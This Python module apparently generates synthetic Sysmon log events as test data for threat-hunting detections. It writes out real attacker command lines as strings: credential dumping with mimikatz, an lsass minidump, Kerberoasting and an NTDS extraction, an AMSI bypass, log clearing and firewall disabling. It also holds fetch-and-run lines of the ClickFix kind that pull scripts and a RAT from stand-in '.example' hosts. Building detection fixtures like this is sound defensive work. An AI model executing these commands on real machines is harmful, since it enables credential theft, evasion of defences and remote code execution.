"""Hunting and recent-threat Windows Sysmon synthetic event batches."""

from testlogs.common import *  # noqa: F401,F403
from testlogs.windows_sysmon_bluelight import _bluelight_kill_chain_sysmon_events
from testlogs.windows_sysmon_core import sysmon_event


def _hunting_and_recent_windows_events():
    events = []
    # ── Long Command Line: Extra-long encoded payloads (>500 chars) ──
    long_payload = "A" * 600  # Simulates base64-encoded payload
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line=f"powershell.exe -NoProfile -NonInteractive -EncodedCommand {long_payload}",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=600,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\cmd.exe",
        command_line=f"cmd.exe /c echo {long_payload} | certutil -decode - C:\\Temp\\payload.exe",
        parent_image="C:\\Windows\\explorer.exe",
        offset=601,
    ))

    # ── Lateral Movement Cluster: Multiple tools on same host ──
    pivot_host = "SRV01.corp.local"
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\PsExec.exe",
        command_line="psexec.exe \\\\DC01 -accepteula -s cmd.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=pivot_host,
        offset=610,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\mstsc.exe",
        command_line="mstsc.exe /v:DC01.corp.local /admin",
        parent_image="C:\\Windows\\explorer.exe",
        host=pivot_host,
        offset=611,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Enter-PSSession -ComputerName DC01",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=pivot_host,
        offset=612,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\net.exe",
        command_line="net use \\\\DC01\\c$ /user:CORP\\admin P@ssw0rd",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=pivot_host,
        offset=613,
    ))

    # ── Credential Access Cluster: Multiple techniques on same host ──
    cred_host = "DC01.corp.local"
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\mimikatz.exe",
        command_line="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=620,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Temp\\lsass.dmp full",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=621,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\Rubeus.exe",
        command_line="Rubeus.exe kerberoast /outfile:hashes.txt",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=622,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\ntdsutil.exe",
        command_line='ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Temp\\ntds" q q',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=623,
    ))

    # ── Defense Evasion Score: Multiple evasion techniques on same host ──
    evasion_host = "WS01.corp.local"
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wevtutil.exe",
        command_line="wevtutil.exe cl Security",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=evasion_host,
        offset=630,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=evasion_host,
        offset=631,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\netsh.exe",
        command_line="netsh advfirewall set allprofiles state off",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=evasion_host,
        offset=632,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\fodhelper.exe",
        command_line="fodhelper.exe",
        parent_image="C:\\Temp\\malware.exe",
        host=evasion_host,
        offset=633,
    ))

    # ── Unusual Process Paths: Processes from non-standard locations ──
    unusual_procs = [
        ("C:\\Users\\Public\\evil.exe", "C:\\Users\\Public\\evil.exe --connect 10.0.0.1"),
        ("C:\\Users\\analyst\\Downloads\\tool.exe", "tool.exe -scan -all"),
        ("C:\\Users\\analyst\\AppData\\Local\\Temp\\update.exe", "update.exe --install"),
    ]
    for i, (image, cmd) in enumerate(unusual_procs):
        events.append(sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=640+i,
        ))

    events.extend(_bluelight_kill_chain_sysmon_events())

    # ── Rare processes (Hunt: Windows Rare Processes) ──
    # The hunting query thresholds executions < 80 across the multi-week window.
    # Emit a handful of unique binaries that appear exactly once each so the
    # rare-process tail of the distribution is non-empty when the dataset is
    # multiplied by ``expand_events_over_days``.
    rare_binaries = [
        ("C:\\Tools\\rare_recon.exe", "rare_recon.exe -enum users"),
        ("C:\\Users\\Public\\beacon_unique.exe", "beacon_unique.exe -c attacker.example"),
        ("C:\\Temp\\loader_x42.exe", "loader_x42.exe /quiet /payload"),
        ("C:\\Tools\\custom_persist.exe", "custom_persist.exe install"),
        ("C:\\Users\\Public\\anomaly_dropper.exe", "anomaly_dropper.exe stage"),
        ("C:\\ProgramData\\unique_loader.exe", "unique_loader.exe /run"),
    ]
    for i, (image, cmd) in enumerate(rare_binaries):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=900 + i,
        ))

    # ── 2025-2026: ClickFix / fake CAPTCHA clipboard execution ──
    clickfix_processes = [
        (
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"# ClickFix fake CAPTCHA clipboard verification; iwr https://captcha-verify.example/update.ps1 | iex\"",
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "initial_access",
        ),
        (
            "C:\\Windows\\System32\\mshta.exe",
            "mshta.exe https://captcha-verify.example/captcha.hta # ClickFix fake CAPTCHA payload",
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
            "execution",
        ),
        (
            "C:\\Windows\\System32\\rundll32.exe",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";GetObject(\"script:https://captcha-verify.example/payload.sct\") # ClickFix",
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "defense_evasion",
        ),
    ]
    for i, (image, cmd, parent, stage) in enumerate(clickfix_processes):
        event = sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image=parent,
            host=CLICKFIX_COMPROMISED_HOST,
            user="CORP\\arya",
            msg="ClickFix fake CAPTCHA clipboard execution",
            offset=930 + i,
        )
        event["Trace ID"] = CLICKFIX_TRACE_ID
        event["Attack Stage"] = stage
        event["Threat Name"] = "ClickFix Clipboard Execution"
        events.append(event)

    crashfix_processes = [
        (
            "C:\\Users\\Public\\Python311\\python.exe",
            "python.exe C:\\Users\\Public\\CrashFix\\crashfix.py --install-rat --c2 https://crashfix-help.example/api",
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
            "payload_execution",
        ),
        (
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -NoProfile -Command \"Invoke-WebRequest https://crashfix-help.example/python-rat.zip -OutFile C:\\Users\\Public\\CrashFix\\rat.zip\"",
            "C:\\Users\\Public\\Python311\\python.exe",
            "ingress_tool_transfer",
        ),
    ]
    for i, (image, cmd, parent, stage) in enumerate(crashfix_processes):
        event = sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image=parent,
            host=CLICKFIX_COMPROMISED_HOST,
            user="CORP\\arya",
            msg="CrashFix Python RAT activity following ClickFix social engineering",
            offset=940 + i,
        )
        event["Trace ID"] = CLICKFIX_TRACE_ID
        event["Attack Stage"] = stage
        event["Threat Name"] = "CrashFix Python RAT"
        events.append(event)

    # ── 2025: RMM tool abuse after compromise ──
    rmm_processes = [
        (
            "C:\\Program Files (x86)\\ScreenConnect Client (d4f1)\\ScreenConnect.ClientService.exe",
            "ScreenConnect.ClientService.exe /silent /reconnect relay.screenconnect.example",
        ),
        (
            "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe",
            "AnyDesk.exe --start-service --with-password",
        ),
        (
            "C:\\Program Files\\Atera Networks\\AteraAgent.exe",
            "AteraAgent.exe /install /tenant rmm-sync.atera.example",
        ),
    ]
    for i, (image, cmd) in enumerate(rmm_processes):
        event = sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            host=CLICKFIX_COMPROMISED_HOST,
            user="CORP\\arya",
            msg="Post-compromise RMM tool execution",
            offset=950 + i,
        )
        event["Trace ID"] = RMM_TRACE_ID
        event["Attack Stage"] = "remote_access"
        event["Threat Name"] = "RMM Tool Abuse"
        events.append(event)


    return events
